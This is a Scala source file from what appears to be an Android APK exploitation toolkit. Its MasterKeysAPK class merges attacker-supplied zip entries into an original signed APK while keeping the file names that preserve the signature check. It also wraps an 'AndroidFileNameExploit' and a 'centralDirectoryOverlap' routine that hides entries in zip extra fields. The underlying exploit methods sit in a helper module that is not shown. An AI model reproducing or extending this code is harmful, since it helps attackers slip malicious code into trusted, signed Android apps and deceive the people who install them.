package android.zip.arbitrage

import utils.{OptionHelper, ZipFile, FileEntry}
import scala.util.Try
import java.io.File

object MasterKeysAPK {
  def apply(file:File, original:Boolean):Try[MasterKeysAPK] =
    ZipFile(file) map (MasterKeysAPK(_,original))

  def apply(file:Option[File], original:Boolean):Try[MasterKeysAPK] =
    OptionHelper.optionToTry(file,"No file given").flatMap(MasterKeysAPK(_,original))

  def apply(files:Seq[File], original:Boolean):Try[MasterKeysAPK]  = Try {
    MasterKeysAPK(new ZipFile(files.map(FileEntry(_))), original)
  }
}
case class MasterKeysAPK(w:Seq[FileEntry], origApp:Boolean = false) extends ZipFile(w){
  private val originalFileNameSet =  w.map(_.zEntry.getName)

  override def hashNormalizedMerge(z:ZipFile):ZipFile =
    if(origApp){
      val filesWithoutNameCollisions =
         z.map(_.zEntry.getName).filter(fName => !originalFileNameSet.contains(fName))
      if(!filesWithoutNameCollisions.isEmpty)
        throw new Exception(s"The following files do not exist in the original apk and thus would break the signatures: $filesWithoutNameCollisions")
      else
        super.hashNormalizedMerge(z)
    } else super.hashNormalizedMerge(z)

  def AndroidFileNameExploit(z:ZipFile):ZipFile =
     z.fileNameExploit(this)

  def centralDirectoryOverlap(z:ZipFile):ZipFile = {
    if(!origApp) throw new Exception("Must Be original App")
    //TODO: Strip out META-INF folder from secondary zip
    z.hideCentralDataEntriesInExtra(this)
  }

  def centralDirectoryOverlap(files:Seq[File]):ZipFile = {
    if(!origApp) throw new Exception("Must Be original App")
    //TODO: Strip out META-INF folder from secondary zip
    this.hideCentralDataEntriesInExtra(files)
  }



}
